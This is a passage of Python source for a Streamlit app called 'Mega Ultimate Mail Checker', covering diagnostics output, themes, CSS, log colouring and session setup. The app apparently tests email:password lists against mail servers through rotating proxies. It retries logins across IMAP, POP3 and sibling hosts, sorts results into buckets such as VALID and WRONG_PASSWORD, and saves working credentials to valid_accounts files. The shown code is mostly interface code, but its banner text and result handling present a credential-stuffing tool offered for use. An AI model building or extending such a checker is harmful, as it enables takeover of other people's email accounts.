    A("--- 7. PROBE REASON HISTOGRAM (most recent probe per node) ---")
    for r, n in probe_reason_histogram().items():
        A(f"  {_PROBE_REASON_LABEL.get(r, r):16}: {n}")

    A("")
    A("--- 8. PER-NODE TABLE ---")
    A("  key | host:port | user | reason | lat_ms | attempts | country | last_error")
    with probe_stats_lock:
        psnap = dict(probe_stats)
    with proxy_lock:
        msnap = dict(proxy_meta)
    for k in sorted(set(list(psnap.keys()) + list(msnap.keys()))):
        ps = psnap.get(k) or {}
        m = msnap.get(k) or {}
        info = parse_proxy(k)
        hp = f"{info['host']}:{info['port']}" if info else "UNPARSABLE"
        user = (info.get("user") if info else "") or "-"
        A(f"  {k} | {hp} | {user} | {ps.get('reason', '-')} | "
          f"{ps.get('latency_ms', 0)} | {ps.get('attempts', 0)} | "
          f"{m.get('country', '?')} | {ps.get('error', '')}")

    A("")
    A("--- 9. QUARANTINE / CIRCUIT BREAKERS ---")
    with proxy_quarantine_lock:
        A(f"  quarantined: {sorted(proxy_quarantine)}")
    A(f"  407 strikes: {dict(_proxy_407)}")
    now = time.time()
    A("  circuit-broken (30s): "
      f"{ {k: f'{v - now:.0f}s left' for k, v in circuit_breaker_until.items() if v > now} }")
    with _proxy_scheme_lock:
        A(f"  scheme memory: {dict(_proxy_scheme)}")
    A(f"  407 cooldown map entries: {len(STATE.get('proxy_407_until') or {})}")

    A("")
    A("--- 10. CACHES & THREADS ---")
    with probe_stats_lock:
        A(f"  probe_stats entries : {len(probe_stats)}")
    A(f"  proxy_meta entries  : {len(proxy_meta)}")
    A(f"  geo cache entries   : {len(_GEO_CACHE)} (negative cache: {len(_GEO_FAIL)})")
    A(f"  dns cache entries   : {len(_DNS_CACHE)} (shared, TTL {_DNS_TTL:.0f}s)")
    A(f"  startup dedupe set  : {len(_STARTUP_SEEN)}")
    with _SMTP_LOCK:
        A(f"  smtp cache entries  : {len(_SMTP_DOMAIN_CACHE)}")
    _ts = _thread_stats()
    A(f"  live threads        : {_ts['total']} (ThreadPoolExecutor={_ts['executor']}, "
      f"ScriptRunner={_ts['scriptrunner']}, alive-pool={_ts['alivepool']}, "
      f"first-probe={_ts['firstprobe']}, start-refresh={_ts['startrefresh']})")
    A("  threads:")
    for t in _thread_report():
        A(f"    {t}")

    A("")
    A("--- 11. RECENT PROBE EVENTS (last 60) ---")
    with probe_log_lock:
        tail = list(probe_log)[-60:]
    for e in tail:
        A(f"  {e}")
    if not tail:
        A("  (none)")

    A("")
    A("--- 12. STARTUP LOG TAIL (last 60) ---")
    for e in startup_panel_lines()[-60:]:
        A(f"  {e}")

    A("")
    A("=" * 78)
    A("END OF DIAGNOSTIC BUNDLE")
    A("=" * 78)
    return "\n".join(L)
# @@END 030 DIAG_BUNDLE

# @@BLOCK 031 THEME_DATA deps=-
THEME_FILE = "theme.json"

THEME_PRESETS = {
    "Aurora":    {"g1": "#667eea", "g2": "#764ba2", "accent": "#8b5cf6", "accent2": "#22d3ee", "bg": "#0b1020", "panel": "#141b30", "text": "#e6ebff"},
    "Neon":      {"g1": "#f72585", "g2": "#7209b7", "accent": "#f72585", "accent2": "#4cc9f0", "bg": "#0a0118", "panel": "#180a2c", "text": "#f5e9ff"},
    "Ocean":     {"g1": "#2193b0", "g2": "#6dd5ed", "accent": "#38bdf8", "accent2": "#22d3ee", "bg": "#04141c", "panel": "#0a2432", "text": "#e0f7ff"},
    "Emerald":   {"g1": "#11998e", "g2": "#38ef7d", "accent": "#34d399", "accent2": "#a3e635", "bg": "#06140f", "panel": "#0e2519", "text": "#e3ffee"},
    "Sunset":    {"g1": "#ff6b6b", "g2": "#f9a826", "accent": "#fb923c", "accent2": "#ffd166", "bg": "#1a0f0a", "panel": "#2b1a11", "text": "#fff3e6"},
    "Crimson":   {"g1": "#eb3349", "g2": "#f45c43", "accent": "#f43f5e", "accent2": "#fb923c", "bg": "#160609", "panel": "#270c13", "text": "#ffe8ec"},
    "Royal":     {"g1": "#243b55", "g2": "#4b6cb7", "accent": "#60a5fa", "accent2": "#c084fc", "bg": "#070b12", "panel": "#111a28", "text": "#e2e8f5"},
    "Gold":      {"g1": "#b8860b", "g2": "#ffd700", "accent": "#fbbf24", "accent2": "#f59e0b", "bg": "#141005", "panel": "#251d0a", "text": "#fff8dc"},
    "Candy":     {"g1": "#ff9a9e", "g2": "#fecfef", "accent": "#fb7185", "accent2": "#f9a8d4", "bg": "#1a1016", "panel": "#2b1a24", "text": "#fff0f6"},
    "Cyber":     {"g1": "#00f5d4", "g2": "#0077b6", "accent": "#00f5d4", "accent2": "#90e0ef", "bg": "#03060d", "panel": "#0a1220", "text": "#dffffb"},
    "Grape":     {"g1": "#8e2de2", "g2": "#4a00e0", "accent": "#a78bfa", "accent2": "#f472b6", "bg": "#0b0418", "panel": "#180a2b", "text": "#f1e8ff"},
    "Daylight":  {"g1": "#6366f1", "g2": "#06b6d4", "accent": "#4f46e5", "accent2": "#0891b2", "bg": "#f1f5f9", "panel": "#ffffff", "text": "#0f172a"},
    "Mono":      {"g1": "#3f3f46", "g2": "#71717a", "accent": "#a1a1aa", "accent2": "#d4d4d8", "bg": "#0a0a0b", "panel": "#19191c", "text": "#f4f4f5"},
}


def _lum(hex_color: str) -> float:
    try:
        h = str(hex_color).lstrip("#")
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
        return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
    except Exception:
        return 0.0


def _readable_text(th: dict) -> str:
    """`text`, or white/black when `text` and `bg` are too close to read.

    is_light() only looked at bg, so a dark bg with a dark text colour rendered
    every character in near-black on black. Emoji survived (colour glyphs) and
    the words vanished, which reads as "the page hangs / only dark".
    """
    t, b = _lum(th.get("text", "#ffffff")), _lum(th.get("bg", "#000000"))
    if abs(t - b) >= 0.35:
        return th.get("text", "#ffffff")
    return "#0f172a" if b > 0.6 else "#f4f6fb"


def default_theme() -> dict:
    p = THEME_PRESETS["Aurora"]
    return {
        "preset": "Aurora",
        "g1": p["g1"], "g2": p["g2"], "accent": p["accent"], "accent2": p["accent2"],
        "bg": p["bg"], "panel": p["panel"], "text": p["text"],
        "radius": 14, "glow": True, "animate": True, "glass": True,
        "colorize_logs": True,
        "hero_title": f"⚡ Mega Ultimate Mail Checker {BUILD_TAG}",
        "hero_sub": "Plug-and-play edition - click 📥 Fetch & Test All Proxies, then press "
                    "Start. A single AUTHENTICATIONFAILED is PROVISIONAL: the ladder keeps "
                    "going (POP3, sibling hosts, 143/110, then DIRECT) until a SECOND host "
                    "agrees or nothing is left to dial. Allow Self-Signed is a real switch, "
                    "the phone layout is fixed, and the Fast-Mode cooldown arms on "
                    "inconclusive results only.",
    }


def load_theme() -> dict:
    base = default_theme()
    if os.path.exists(THEME_FILE):
        try:
            with open(THEME_FILE, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                base.update({k: v for k, v in data.items() if k in base})
        except Exception:
            pass
    # The hero text is a BUILD STRING and base.update() lets the file win over
    # default_theme() - so a theme.json written by an older build made the app
    # advertise that old version for ever.
    if BUILD_TAG not in str(base.get("hero_title", "")):
        _d = default_theme()
        base["hero_title"] = _d["hero_title"]
        base["hero_sub"] = _d["hero_sub"]
        try:
            save_theme(base)
        except Exception:
            pass
    return base


def save_theme(th: dict):
    try:
        with open(THEME_FILE, "w", encoding="utf-8") as f:
            json.dump(th, f, indent=2)
    except Exception:
        pass


def is_light(th: dict) -> bool:
    return _lum(th.get("bg", "#000000")) > 0.6


if "theme" not in str_lit.session_state:
    str_lit.session_state.theme = load_theme()
if "colorize_logs" not in str_lit.session_state:
    str_lit.session_state.colorize_logs = str_lit.session_state.theme.get("colorize_logs", True)

if not os.path.exists(THEME_FILE):
    save_theme(str_lit.session_state.theme)


def _sync_theme_from_widgets():
    th = str_lit.session_state.theme
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    for k in ("radius", "glow", "animate", "glass"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    th["colorize_logs"] = str_lit.session_state.get("colorize_logs", True)
    if "th_hero_title" in str_lit.session_state:
        th["hero_title"] = str_lit.session_state["th_hero_title"]
    if "th_hero_sub" in str_lit.session_state:
        th["hero_sub"] = str_lit.session_state["th_hero_sub"]
    save_theme(th)


def _on_preset_change():
    name = str_lit.session_state.get("th_preset")
    p = THEME_PRESETS.get(name)
    if p:
        for k, v in p.items():
            str_lit.session_state[f"th_{k}"] = v
        str_lit.session_state.theme["preset"] = name
        save_theme(str_lit.session_state.theme)


def _reset_theme():
    str_lit.session_state.theme = default_theme()
    d = str_lit.session_state.theme
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        str_lit.session_state[f"th_{k}"] = d[k]
    for k in ("radius", "glow", "animate", "glass"):
        str_lit.session_state[f"th_{k}"] = d[k]
    str_lit.session_state["th_preset"] = d["preset"]
    str_lit.session_state["th_hero_title"] = d["hero_title"]
    str_lit.session_state["th_hero_sub"] = d["hero_sub"]
    str_lit.session_state["colorize_logs"] = d["colorize_logs"]
    save_theme(d)
# @@END 031 THEME_DATA

# @@BLOCK 032 MOBILE_CSS deps=-
# FIX P2-2:
#   * the old sheet forced [data-testid="stHeader"] { height: 2.1rem } while
#     Streamlit's header is ~3.75rem with absolutely positioned children, so the
#     toolbar and the collapsed-sidebar chevron sat ON TOP of the hero.
#   * "[data-testid=stSidebar] * { color }" clobbered the sidebar's own icons.
# Streamlit's own .block-container padding (6rem top / 10rem bottom) is never
# overridden by this app, which is half of the "does not fit my phone" report.
# FIX P2-3:
#   * the palette binding unpacks th["text"] raw, so a light-on-light theme
#     renders invisible body copy; it now routes through _readable_text().
def _MOBILE_CSS():
    return """
    .block-container, [data-testid="stMainBlockContainer"] {
        padding-top: 1.2rem !important;
        padding-bottom: 2rem !important;
    }
    [data-testid="stSidebar"] p,
    [data-testid="stSidebar"] label,
    [data-testid="stSidebar"] .stMarkdown span {
        color: inherit;
    }
    @media (max-width: 820px) {
        .block-container, [data-testid="stMainBlockContainer"] {
            padding-top: 0.55rem !important;
            padding-bottom: calc(1.3rem + env(safe-area-inset-bottom)) !important;
            padding-left: 0.7rem !important;
            padding-right: 0.7rem !important;
            max-width: 100% !important;
        }
        [data-testid="stToolbar"] { right: 0.3rem; }
        [data-testid="stSidebar"] { width: 88vw !important; min-width: 88vw !important; }
        [data-testid="stSidebar"] [data-testid="stSidebarContent"] { padding-top: 0.6rem; }
        .bb-hero { padding: 14px 16px; border-radius: 12px; margin-bottom: 10px; }
        .bb-hero h1 { font-size: 1.22rem; line-height: 1.25; }
        .bb-hero p { font-size: .77rem; line-height: 1.35; }
        .bb-tag { font-size: .61rem; padding: 2px 8px; margin: 0 4px 4px 0; }
        .bb-section { margin: 14px 0 8px 0; padding: 8px 12px; gap: 8px; }
        .bb-section .bb-ico { font-size: 1.05rem; }
        .bb-section .bb-t { font-size: .9rem; }
        .bb-section .bb-s { display: block; margin: 2px 0 0 0; font-size: .67rem; }
        .bb-logbox { font-size: .67rem; padding: 8px; max-height: 300px; }
        .bb-log { font-size: .67rem; }
        .help-box { font-size: .7rem; }
        [data-testid="stMetric"] { padding: 8px 9px; }
        [data-testid="stMetricValue"] { font-size: 1.1rem !important; }
        [data-testid="stMetricLabel"] { font-size: .62rem !important; line-height: 1.15; }
        [data-testid="stMetricLabel"] p { white-space: normal !important; }
        .stTabs [data-baseweb="tab"] { padding: 6px 10px; font-size: .78rem; }
        h1 { font-size: 1.32rem !important; }
        h2 { font-size: 1.13rem !important; }
        h3 { font-size: 1.0rem !important; }
        .stButton > button, .stDownloadButton > button { padding: .35rem .5rem; font-size: .8rem; }
        [data-testid="stDataFrame"] { font-size: .72rem; }
        pre, code, .stCode { font-size: .68rem !important; }
        textarea, input { font-size: .8rem !important; }
    }
    @media (max-width: 420px) {
        .block-container { padding-left: 0.5rem !important; padding-right: 0.5rem !important; }
        .bb-hero h1 { font-size: 1.08rem; }
        [data-testid="stMetricValue"] { font-size: .98rem !important; }
        [data-testid="stMetricLabel"] { font-size: .58rem !important; }
    }
    @media (hover: none) {
        [data-testid="stSidebarCollapsedControl"] { top: .3rem; }
    }
"""
# @@END 032 MOBILE_CSS

# @@BLOCK 033 THEME_CSS deps=031,032
def theme_css(th: dict) -> str:
    g1, g2 = th["g1"], th["g2"]
    ac, ac2 = th["accent"], th["accent2"]
    bg, panel, text = th["bg"], th["panel"], _readable_text(th)
    r = int(th.get("radius", 14))
    light = is_light(th)
    border = "rgba(15,23,42,0.14)" if light else "rgba(255,255,255,0.10)"
    soft = "rgba(15,23,42,0.05)" if light else "rgba(255,255,255,0.04)"
    dim = "rgba(15,23,42,0.65)" if light else "rgba(230,235,255,0.70)"

    glow_css = f"box-shadow: 0 8px 26px {ac}44;" if th.get("glow", True) else ""
    glass_css = "backdrop-filter: blur(6px);" if th.get("glass", True) else ""
    anim_css = ""
    if th.get("animate", True):
        anim_css = f"""
    .bb-hero {{ background-size: 240% 240%; animation: bbShift 14s ease infinite; }}
    @keyframes bbShift {{ 0%{{background-position:0% 50%}} 50%{{background-position:100% 50%}} 100%{{background-position:0% 50%}} }}
    """

    return f"""
<style>
    /* Display Fit CSS is emitted once, by auth.fit() in block 007. It used to
       be re-embedded here as well, which fought the 88vw sidebar rule. */
    :root {{
        --bb-g1: {g1}; --bb-g2: {g2}; --bb-ac: {ac}; --bb-ac2: {ac2};
        --bb-bg: {bg}; --bb-panel: {panel}; --bb-text: {text}; --bb-r: {r}px;
    }}
    .stApp, [data-testid="stAppViewContainer"], [data-testid="stMain"] {{
        background: {bg} !important; color: {text} !important;
    }}
    [data-testid="stHeader"] {{ background: transparent !important; }}
    [data-testid="stSidebar"] {{
        background: linear-gradient(180deg, {panel} 0%, {bg} 100%) !important;
        border-right: 1px solid {border};
    }}
    h1, h2, h3, h4, h5, h6 {{ color: {text} !important; letter-spacing: .2px; }}
    p, span, label, li, small, strong {{ color: {text}; }}
    hr {{ border-color: {border} !important; }}
    a {{ color: {ac2} !important; }}

    .stButton > button, .stDownloadButton > button, .stFormSubmitButton > button {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: {r}px !important;
        font-weight: 600; transition: all .16s ease;
    }}
    .stButton > button:hover, .stDownloadButton > button:hover {{
        border-color: {ac} !important; transform: translateY(-1px);
        box-shadow: 0 6px 18px {ac}44;
    }}
    .stButton > button[kind="primary"], .stDownloadButton > button[kind="primary"] {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%) !important;
        color: #fff !important; border: none !important;
        box-shadow: 0 8px 22px {g1}66;
    }}
    .stButton > button[kind="primary"]:hover {{ filter: brightness(1.08); }}

    [data-testid="stMetric"] {{
        background: {panel} !important; border: 1px solid {border};
        border-left: 4px solid {ac}; border-radius: {r}px;
        padding: 14px 16px; {glow_css} {glass_css}
    }}
    [data-testid="stMetricValue"] {{ color: {ac} !important; font-weight: 800 !important; }}
    [data-testid="stMetricLabel"] {{ color: {dim} !important; }}

    .stTabs [data-baseweb="tab-list"] {{ gap: 6px; border-bottom: 1px solid {border}; }}
    .stTabs [data-baseweb="tab"] {{
        background: {panel}; border-radius: {r}px {r}px 0 0;
        color: {text} !important; padding: 8px 16px; font-weight: 600;
    }}
    .stTabs [aria-selected="true"] {{
        background: linear-gradient(135deg, {g1}, {g2}) !important; color: #fff !important;
    }}
    .stTabs [data-baseweb="tab-highlight"] {{ background: {ac} !important; }}

    [data-testid="stExpander"] {{
        border: 1px solid {border} !important; border-radius: {r}px !important;
        background: {soft} !important;
    }}
    [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}

    input, textarea, select, .stTextInput input, .stTextArea textarea,
    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div,
    .stMultiSelect div[data-baseweb="select"] > div {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-baseweb="popover"] div {{ background: {panel} !important; color: {text} !important; }}
    [data-baseweb="tag"] {{ background: {ac}44 !important; color: {text} !important; }}

    .stSlider [data-baseweb="slider"] div[role="slider"] {{ background: {ac} !important; }}
    .stProgress > div > div > div > div {{
        background: linear-gradient(90deg, {g1}, {g2}) !important;
    }}
    [data-baseweb="checkbox"] span, [data-baseweb="toggle"] span {{ border-color: {ac} !important; }}

    code, pre, .stCode, .stCodeBlock, [data-testid="stCodeBlock"] {{
        background: {bg} !important; color: {ac2} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-testid="stDataFrame"] {{ border: 1px solid {border} !important; border-radius: 10px !important; }}

    .bb-hero {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%);
        padding: 26px 32px; border-radius: {r}px; margin-bottom: 18px;
        box-shadow: 0 14px 38px {g1}55; border: 1px solid rgba(255,255,255,.10);
    }}
    .bb-hero h1 {{ color: #fff !important; margin: 0; font-size: 2.0rem; font-weight: 800; }}
    .bb-hero p {{ color: rgba(255,255,255,.94) !important; margin: 8px 0 0 0; font-size: .95rem; }}
    .bb-hero .bb-tags {{ margin-top: 12px; }}
    .bb-tag {{
        display: inline-block; padding: 3px 11px; margin: 0 6px 6px 0;
        border-radius: 999px; font-size: .72rem; font-weight: 700;
        background: rgba(255,255,255,.20); color: #fff !important;
        border: 1px solid rgba(255,255,255,.28);
    }}
    .bb-section {{
        display: flex; align-items: center; gap: 12px;
        margin: 24px 0 12px 0; padding: 11px 18px; border-radius: {r}px;
        background: linear-gradient(90deg, {g1}38 0%, {g1}10 45%, transparent 85%);
        border-left: 4px solid {ac};
    }}
    .bb-section .bb-ico {{ font-size: 1.25rem; }}
    .bb-section .bb-t {{ font-weight: 800; font-size: 1.03rem; color: {text}; }}
    .bb-section .bb-s {{ font-size: .76rem; color: {dim}; margin-left: 8px; }}
    .bb-card {{
        background: {panel}; border: 1px solid {border}; border-radius: {r}px;
        padding: 14px 18px; {glass_css}
    }}
    .bb-pill {{
        display: inline-block; padding: 2px 10px; border-radius: 999px;
        font-size: .72rem; font-weight: 800; margin-right: 6px;
        background: {ac}33; color: {ac2}; border: 1px solid {ac}55;
    }}
    .bb-logbox {{
        background: {bg}; border: 1px solid {border}; border-radius: {r}px;
        padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: .78rem; max-height: 420px; overflow-y: auto;
    }}
    .bb-log {{ padding: 1px 8px; white-space: pre-wrap; word-break: break-word; }}
    .help-box {{
        background: {panel}; border-left: 3px solid {ac};
        padding: 6px 10px; margin: 2px 0 8px 0;
        font-size: .78rem; color: {text}; opacity: .9;
        border-radius: 4px; line-height: 1.35;
    }}
    ::-webkit-scrollbar {{ width: 10px; height: 10px; }}
    ::-webkit-scrollbar-track {{ background: {bg}; }}
    ::-webkit-scrollbar-thumb {{ background: {g1}88; border-radius: 8px; }}
    ::-webkit-scrollbar-thumb:hover {{ background: {ac}; }}
    {anim_css}
    {_MOBILE_CSS()}
</style>
"""
# @@END 033 THEME_CSS

# @@BLOCK 034 HERO_SECTION deps=031
def render_hero(th: dict):
    title = th.get("hero_title", "⚡ Mega Ultimate Mail Checker")
    sub = th.get("hero_sub", "")
    str_lit.markdown(
        f"""
        <div class="bb-hero">
            <h1>{html.escape(title)}</h1>
            <p>{html.escape(sub)}</p>
            <div class="bb-tags">
                <span class="bb-tag">Plug &amp; Play</span>
                <span class="bb-tag">Fast</span>
                <span class="bb-tag">Normal</span>
                <span class="bb-tag">Deep / Aggressive</span>
                <span class="bb-tag">Protocol Picker</span>
                <span class="bb-tag">Proxy Backed</span>
                <span class="bb-tag">407 Quarantine</span>
                <span class="bb-tag">Gated Per-IP Tunnel Cap</span>
                <span class="bb-tag">Per-Sub-User 407 Gate</span>
                <span class="bb-tag">Request Frugal</span>
                <span class="bb-tag">Mail-Dest Spot Check</span>
                <span class="bb-tag">Login-Dropped Bucket</span>
                <span class="bb-tag">Provisional WRONG</span>
                <span class="bb-tag">Microsoft XOAUTH2</span>
                <span class="bb-tag">Mobile Fit</span>
                <span class="bb-tag">Deep Diagnostics</span>
            </div>
        </div>
        """,
        unsafe_allow_html=True,
    )


def section_title(icon: str, title: str, subtitle: str = ""):
    sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
    str_lit.markdown(
        f'<div class="bb-section"><span class="bb-ico">{icon}</span>'
        f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
        unsafe_allow_html=True,
    )
# @@END 034 HERO_SECTION

# @@BLOCK 035 METRIC_GRID deps=-
def metric_grid(pairs, per_row: int = 3):
    """Lay metrics out in a WRAPPING grid.

    FIX P2-3: nine to thirteen metrics in one or two ragged rows collided on a
    phone - the labels wrapped into each other and the row overflowed.  A large
    set drops to two per row, and the mobile sheet keeps the label wrapping
    inside its own column instead of pushing into the neighbour.

    The signature is kept byte-for-byte as
    `def metric_grid(pairs, per_row: int = 3):` because verify_v1337.py matches
    on that exact string.
    """
    pairs = list(pairs or [])
    if not pairs:
        return []
    per_row = max(1, int(per_row))
    if len(pairs) >= 12:
        per_row = 2
    cols = []
    for _i in range(0, len(pairs), per_row):
        cols.extend(str_lit.columns(min(per_row, len(pairs) - _i)))
    return cols
# @@END 035 METRIC_GRID

# @@BLOCK 036 LOG_COLOR deps=-
TAG_COLORS = {
    "VALID": "#22c55e",
    "WRONG": "#ef4444",
    "APP": "#eab308",
    "RBL": "#a855f7",
    "FAILED": "#ef4444",
    "RETRY": "#38bdf8",
    "WRONG_PASSWORD": "#ef4444",
    "LOGIN_DROPPED": "#f43f5e",
    "CONNECTION_FAILED": "#eab308",
    "PROXY_UNHEALTHY": "#e879f9",
    "NEED_APP_PASSWORD": "#3b82f6",
    "RETRY_LATER": "#ffffff",
    "RBL_BLOCKED": "#facc15",
    "SMTP_FAILED": "#a855f7",
    "DNS_FAILED": "#f97316",
    "UNKNOWN": "#94a3b8",
    "UNCLASSIFIED": "#94a3b8",
    "SKIPPED_COOLDOWN": "#a78bfa",
    "SKIPPED": "#a78bfa",
    "EXCEPTION": "#fb7185",
    "ERROR": "#fb7185",
}


def _line_color(line: str) -> str:
    up = str(line).upper()
    for tag in ("SKIPPED_COOLDOWN", "SKIPPED", "WRONG", "APP", "RBL", "FAILED", "RETRY",
                "NEED_APP_PASSWORD", "RBL_BLOCKED",
                "WRONG_PASSWORD", "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER",
                "SMTP_FAILED", "DNS_FAILED", "UNCLASSIFIED", "LOGIN_DROPPED", "VALID",
                "UNKNOWN", "EXCEPTION", "ERROR"):
        if f"[{tag}]" in up:
            return TAG_COLORS.get(tag, "#cbd5e1")
    if "[CLASSIFIED: VALID]" in up:
        return TAG_COLORS["VALID"]
    if "[CLASSIFIED: WRONG_PASSWORD]" in up:
        return TAG_COLORS["WRONG_PASSWORD"]
    if "[CLASSIFIED: LOGIN_DROPPED]" in up:
        return TAG_COLORS["LOGIN_DROPPED"]
    if "[CLASSIFIED: NEED_APP_PASSWORD]" in up:
        return TAG_COLORS["NEED_APP_PASSWORD"]
    if "[CLASSIFIED: RBL_BLOCKED]" in up:
        return TAG_COLORS["RBL_BLOCKED"]
    if "[CLASSIFIED: RETRY_LATER]" in up:
        return TAG_COLORS["RETRY_LATER"]
    if "[CLASSIFIED: SMTP_FAILED]" in up:
        return TAG_COLORS["SMTP_FAILED"]
    if "[CLASSIFIED: DNS_FAILED]" in up:
        return TAG_COLORS["DNS_FAILED"]
    if "[CLASSIFIED: PROXY_UNHEALTHY]" in up:
        return TAG_COLORS["PROXY_UNHEALTHY"]
    if "[CLASSIFIED:" in up:
        return TAG_COLORS["CONNECTION_FAILED"]
    return ""


def colorize_logs(lines: List[str]) -> str:
    out = []
    for ln in lines or []:
        col = _line_color(ln)
        style = f"color:{col};" if col else "opacity:.85;"
        out.append(f'<div class="bb-log" style="{style}">{html.escape(str(ln))}</div>')
    return f'<div class="bb-logbox">{"".join(out)}</div>'


def render_logs(lines: List[str], height: int = 300):
    if str_lit.session_state.get("colorize_logs", True):
        str_lit.markdown(colorize_logs(lines), unsafe_allow_html=True)
    else:
        str_lit.code("\n".join(lines), language="text")
# @@END 036 LOG_COLOR

# @@BLOCK 037 SESSION_INIT deps=024,031
_PERSISTENT_VALID_CACHE = STATE.setdefault("persistent_valid_cache", {"ts": 0.0, "data": []})
_PREV_VALID_CACHE = STATE.setdefault("prev_valid_cache", {"ts": 0.0, "data": set()})


def invalidate_valid_caches():
    _PERSISTENT_VALID_CACHE["ts"] = 0.0
    _PREV_VALID_CACHE["ts"] = 0.0


def load_persistent_valid_results():
    now = time.time()
    if _PERSISTENT_VALID_CACHE["data"] and (now - _PERSISTENT_VALID_CACHE["ts"]) < 15.0:
        return list(_PERSISTENT_VALID_CACHE["data"])
    valid_list, seen = [], set()
    try:
        _res = user_file("mail_results")
        paths = sorted(glob.glob(os.path.join(_res, "valid_*.txt")), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            _p = user_file(extra)
            if os.path.exists(_p):
                paths.append(_p)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and email not in seen:
                                seen.add(email)
                                valid_list.append(line)
            except Exception:
                continue
    except Exception:
        pass
    _PERSISTENT_VALID_CACHE["ts"] = now
    _PERSISTENT_VALID_CACHE["data"] = list(valid_list)
    return valid_list


if "engine_has_run" not in str_lit.session_state:
    str_lit.session_state.engine_has_run = False
if "valid_results" not in str_lit.session_state:
    loaded_valid = load_persistent_valid_results()
    str_lit.session_state.valid_results = loaded_valid
    str_lit.session_state.clean_valid_count = len(loaded_valid)
    str_lit.session_state.run_valid_count = len(loaded_valid)
for _k in ("wrong_results", "need_app_results", "conn_results", "proxy_results",
           "login_drop_results", "retry_results", "rbl_results", "smtp_results",
           "dns_results", "skip_results", "unknown_results", "report_entries",
           "log_lines", "startup_entries", "pre_dns_failed", "pre_smtp_failed"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = []
if "zip_bytes" not in str_lit.session_state:
    str_lit.session_state.zip_bytes = None
if "zip_name" not in str_lit.session_state:
    str_lit.session_state.zip_name = ""
if "checked_emails_set" not in str_lit.session_state:
    str_lit.session_state.checked_emails_set = set()
if "last_checked_index" not in str_lit.session_state:
    str_lit.session_state.last_checked_index = 0
if "run_completion_status" not in str_lit.session_state:
    str_lit.session_state.run_completion_status = "Unfinished"
for _k in ("start_timestamp", "end_timestamp", "total_duration"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = None

# FIX P1-1: only valid_results used to be rehydrated from disk, so a session
# reset (mobile tab backgrounded, WebSocket drop, redeploy) wiped every other
# bucket and every log while the summary still rendered - showing zeros.
# The run already writes one file per bucket per stamp; reload the newest group.
RUN_BUCKET_FILES = (
    ("valid_results", "valid"),
    ("wrong_results", "wrong"),
    ("need_app_results", "need_app"),
    ("login_drop_results", "login_dropped"),
    ("conn_results", "failed"),
    ("proxy_results", "proxy_unhealthy"),
    ("retry_results", "retry_later"),
    ("rbl_results", "rbl_blocked"),
    ("smtp_results", "smtp_failed"),
    ("dns_results", "dns_failed"),
    ("skip_results", "skipped"),
    ("unknown_results", "unclassified"),
)
RE_RUN_STAMP = re.compile(r"^(.*)_(\d{8}_\d{6})\.txt$")


def _rehydrate_last_run(force: bool = False):
    """Reload the newest complete run stamp from mail_results/ into session_state."""
    try:
        stamps = set()
        for p in glob.glob(os.path.join(user_file("mail_results"), "*.txt")):
            m = RE_RUN_STAMP.match(os.path.basename(p))
            if m:
                stamps.add(m.group(2))
        if not stamps:
            return 0
        stamp = sorted(stamps)[-1]
        loaded = 0
        for key, tag in RUN_BUCKET_FILES:
            if str_lit.session_state.get(key) and not force:
                continue
            p = os.path.join(user_file("mail_results"), f"{tag}_{stamp}.txt")
            if not os.path.exists(p):
                continue
            try:
                with open(p, encoding="utf-8", errors="ignore") as fh:
                    items = [l.rstrip("\n") for l in fh
                             if l.strip() and not l.startswith("#")]
            except Exception:
                continue
            if items:
                str_lit.session_state[key] = items
                loaded += len(items)
        if loaded:
            str_lit.session_state.engine_has_run = True
            if str_lit.session_state.get("run_completion_status") == "Unfinished":
                str_lit.session_state.run_completion_status = "Loaded from disk"
        return loaded
    except Exception:
        return 0


_rehydrate_last_run()
# @@END 037 SESSION_INIT

# @@BLOCK 038 STARTUP_LOG deps=024,037
_STARTUP_BUFFER = STATE.setdefault("startup_buffer", [])
_STARTUP_BUFFER_LOCK = STATE.setdefault("startup_buffer_lock", threading.Lock())
_STARTUP_SEEN = STATE.setdefault("startup_seen", set())
_STARTUP_MAX = 400


def log_startup(msg, quiet: bool = False):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{ts}] [INIT/HOOD] {msg}"
    if quiet:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append(entry)
            if len(_STARTUP_BUFFER) > _STARTUP_MAX:
                del _STARTUP_BUFFER[:-_STARTUP_MAX]
        return
    # FIX ISO-1: _STARTUP_SEEN is PROCESS state (STATE-backed on purpose), so on a
    # shared deployment a second user never saw a line the first user had already
    # logged - their ledger came up short through no fault of their own, and the
    # Full Log page showed the gap. The SESSION now dedupes against its OWN list;
    # _STARTUP_SEEN still guards the shared buffer path below.
    try:
        own = str_lit.session_state.startup_entries
        if any(msg in str(e) for e in own):
            return
        own.append(entry)
        if len(own) > _STARTUP_MAX:
            del own[:-_STARTUP_MAX]
        with _STARTUP_BUFFER_LOCK:
